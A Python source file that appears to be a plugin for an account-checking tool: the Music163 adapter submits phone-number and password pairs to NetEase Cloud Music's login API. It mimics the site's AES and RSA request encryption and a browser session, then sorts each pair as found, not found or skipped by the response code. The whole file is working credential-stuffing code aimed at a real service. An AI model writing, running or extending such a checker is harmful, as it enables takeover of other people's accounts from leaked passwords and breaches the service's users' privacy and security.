
from .adapter import Adapter
import re
import os
import json
import time
import hashlib
import random
import base64
import binascii


from Crypto.Cipher import AES
from http.cookiejar import LWPCookieJar


modulus = ('00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7'
           'b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280'
           '104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932'
           '575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b'
           '3ece0462db0a22b8e7')
nonce = '0CoJUm6Qyw8W8jud'
pubKey = '010001'


def encrypted_request(text):

    text = json.dumps(text)
    secKey = createSecretKey(16)
    encText = aesEncrypt(aesEncrypt(text, nonce), secKey)
    encSecKey = rsaEncrypt(secKey, pubKey, modulus)
    data = {'params': encText, 'encSecKey': encSecKey}
    return data


def aesEncrypt(text, secKey):
    pad = 16 - len(text) % 16
    text = text + chr(pad) * pad
    encryptor = AES.new(secKey, 2, '0102030405060708')
    ciphertext = encryptor.encrypt(text)
    ciphertext = base64.b64encode(ciphertext).decode('u8')
    return ciphertext


def rsaEncrypt(text, pubKey, modulus):
    text = text[::-1]
    rs = pow(int(binascii.hexlify(text), 16), int(pubKey, 16)) % int(modulus, 16)
    return format(rs, 'x').zfill(256)


def createSecretKey(size):
    return binascii.hexlify(os.urandom(size))[:16]

class Music163(Adapter):

    def __init__(self):

        super(Music163,self).__init__()
        self.name='Music163'
        self.auth_url='https://music.163.com/weapi/login/cellphone'

    def check(self,user,passwd):

        self.logger.info("Check password for  "+self.auth_url)

        post={}
        post["phone"]=user
        post["password"]=hashlib.md5(passwd.encode('utf-8')).hexdigest()
        post["rememberLogin"]='true'
        post=encrypted_request(post)

        sess=self.initSession()
        cookie=sess.get('cookie','')

        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip,deflate,sdch',
            'Accept-Language': 'zh-CN,zh;q=0.8,gl;q=0.6,zh-TW;q=0.4',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'music.163.com',
            'Referer': 'http://music.163.com/search/',
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36',
            'cookie':cookie
        }
        r=self.post(post,headers=headers)

        body=json.loads(r.text)
        code=str(body.get('code',''))

        if(code == '200'):
            self.found(user,passwd)
        elif(code == '502'):
            self.not_found(user,passwd)
        else:
            self.skip('Error happend')
        return


    def initSession(self):

        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip,deflate,sdch',
            'Accept-Language': 'zh-CN,zh;q=0.8,gl;q=0.6,zh-TW;q=0.4',
            'Connection': 'keep-alive',
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36'
        }
        url="http://music.163.com/"
        r=self.get(url,headers=headers)
        cookies=r.cookies

        cookies="; ".join([str(x)+"="+str(y) for x,y in cookies.items()])
        return {"cookie":cookies}
